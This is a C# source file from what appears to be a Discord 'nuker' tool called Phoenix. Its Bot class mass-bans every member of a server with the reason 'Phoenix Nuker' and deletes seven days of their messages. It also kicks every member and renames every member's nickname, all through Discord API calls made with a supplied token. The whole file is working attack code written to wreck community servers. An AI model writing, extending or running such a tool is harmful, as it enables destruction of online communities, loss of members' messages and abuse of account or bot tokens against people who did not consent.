using Newtonsoft.Json.Linq;
using Console = Colorful.Console;
using System.Drawing;
using static Phoenix.API.Config;

namespace Phoenix.API
{
    public class Bot
    {
        public static void BanAllMembers(string? token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send($"/guilds/{gid}/members?limit=1000", "GET", token);
                var array = JArray.Parse(request);
                Console.WriteLine(array);
                int bans = 0;
                foreach (dynamic entry in array)
                {
                    if (bans >= 1000) BanAllMembers(token, gid);
                    bans++;
                    Request.Send($"/guilds/{gid}/bans/" + entry.user["id"], "PUT", token, $"{{\"delete_message_days\": 7, \"reason\": \"Phoenix Nuker\"}}", true);
                    Console.WriteLine($"Banned: {entry.user["username"]}#{entry.user["discriminator"]}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void KickAllMembers(string? token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send($"/guilds/{gid}/members?limit=1000", "GET", token);
                var array = JArray.Parse(request);
                int kicks = 0;
                foreach (dynamic entry in array)
                {
                    if (kicks >= 1000) KickAllMembers(token, gid);
                    kicks++;
                    Request.Send($"/guilds/{gid}/members/" + entry.user["id"], "DELETE", token, null, false);
                    Console.WriteLine($"Kicked: {entry.user["username"]}#{entry.user["discriminator"]}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void ChangeAllNicknames(string? token, ulong? gid, string nick)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send($"/guilds/{gid}/members?limit=1000", "GET", token);
                var array = JArray.Parse(request);
                int changes = 0;
                foreach (dynamic entry in array)
                {
                    if (changes >= 1000) ChangeAllNicknames(token, gid, nick);
                    changes++;
                    Request.Send($"/guilds/{gid}/members/" + entry.user["id"], "PATCH", token, $"{{\"nick\":\"{nick}\"}}", true);
                    Console.WriteLine($"Renamed: {entry.user["username"]}#{entry.user["discriminator"]}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }
    }
}
